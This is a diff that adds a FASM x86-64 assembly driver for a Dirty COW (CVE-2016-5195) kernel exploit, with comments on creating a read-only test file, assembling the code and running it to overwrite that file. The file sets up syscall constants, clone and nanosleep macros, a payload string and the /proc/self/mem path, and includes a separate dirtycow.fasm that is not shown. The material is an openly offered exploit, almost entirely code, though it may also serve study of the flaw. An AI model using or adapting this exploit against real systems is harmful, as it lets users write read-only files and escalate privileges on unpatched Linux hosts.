@@ -1,0 +1,125 @@
+;create readonly file and check
+;> sudo cat 'hello world, this is the original content' > test.txt
+;> sudo chmod -w test.txt
+;> sudo -k
+;> ls -l test.txt
+;> cat test.txt
+;compile
+;> fasm ./main.fasm ./dirtycow
+;and execute
+;> ./dirtycow
+;> cat text.txt
+
+format                                  ELF64                                   executable
+use64
+entry                                   _start_
+sys0arg                                 equ                                     rdi
+sys1arg                                 equ                                     rsi
+sys2arg                                 equ                                     rdx
+sys3arg                                 equ                                     r10
+sys4arg                                 equ                                     r8
+sys5arg                                 equ                                     r9
+sys0ret                                 equ                                     rax
+sys1ret                                 equ                                     rdx
+MMAP_fPrivate                           =                                       0x02
+MMAP_pReadable                          =                                       0x01
+sys_write                               =                                       1
+sys_open                                =                                       2
+sys_fstat                               =                                       5
+sys_lseek                               =                                       8
+sys_mmap                                =                                       9
+sys_madvise                             =                                       28
+sys_nanosleep                           =                                       35
+sys_clone                               =                                       56
+sys_exit                                =                                       60
+null                                    =                                       0
+__qword__                               =                                       8
+page_size                               =                                       4096
+file_modeR                              =                                       0x00000000
+file_modeW                              =                                       0x00000001
+file_modeRW                             =                                       0x00000002
+MADV_DONTNEED                           =                                       4
+
+macro null                              register
+{
+  xor                                   register,                               register
+}
+macro flags                             register
+{
+  or                                    register,                               register
+}
+macro sys_call                          doIt
+{
+  mov                                   rax,                                    doIt
+  syscall
+}
+macro clone                             func,                                   stck
+{
+  null                                  sys4arg
+  null                                  sys3arg
+  null                                  sys2arg
+  lea                                   sys1arg,                                [ stck ]
+  mov                                   sys0arg,                                0x50f00
+  sys_call                              sys_clone
+  flags                                 sys0ret
+  jz                                    func
+}
+macro nanosleep                         sec,                                    nsec
+{
+  if ( sec eq )
+    display                             '[asm] fail: seconds undefined in nanosleep!'
+    err
+  end if
+  mov                                   qword [ time.s ],                       sec
+  if ( nsec eq )
+    mov                                 qword [ time.n ],                       null
+  else
+    mov                                 qword [ time.n ],                       nsec
+  end if
+  null                                  sys1arg
+  lea                                   sys0arg,                                [ time.s ]
+  sys_call                              sys_nanosleep
+}
+
+segment                                 executable                              readable                                writeable
+  _start_:
+    lea                                 sys0arg,                                [ fDirtycow ]
+    lea                                 sys1arg,                                [ msgDirtycow ]
+    mov                                 sys2arg,                                msgDirtycow.size
+    call                                dirtycow
+    null                                sys0arg
+    sys_call                            sys_exit
+  include                               'dirtycow.fasm'
+  fDirtycow                             db                                      './test.txt', 0
+  msgDirtycow                           db                                      '<this should not be here!>', 10
+  msgDirtycow.size                      =                                       $ - msgDirtycow
+  dirtycow.fmem                         db                                      '/proc/self/mem', 0
+  time.s                                rq                                      1
+  time.n                                rq                                      1
+  dirtycow.childs                       rq                                      1
+  dirtycow.filename                     rq                                      1
+  dirtycow.filedesc                     rq                                      1
+  dirtycow.payload                      rq                                      1
+  dirtycow.payload.length               rq                                      1
+  dirtycow.map                          rq                                      1
+  dirtycow.fstat:
+  ;{
+    .dev                                rq                                      1
+    .ino                                rq                                      1
+    .nlink                              rq                                      1
+    .mode                               rd                                      1
+    .uid                                rd                                      1
+    .gid                                rd                                      1
+    .zero                               rd                                      1
+    .rdev                               rq                                      1
+    .size                               rq                                      1
+    .blksize                            rq                                      1
+    .blocks                             rq                                      1
+    .atime                              rq                                      1
+    .atime_nsec                         rq                                      1
+    .mtime                              rq                                      1
+    .mtime_nsec                         rq                                      1
+    .ctime                              rq                                      1
+    .ctime_nsec                         rq                                      1
+  ;}
+
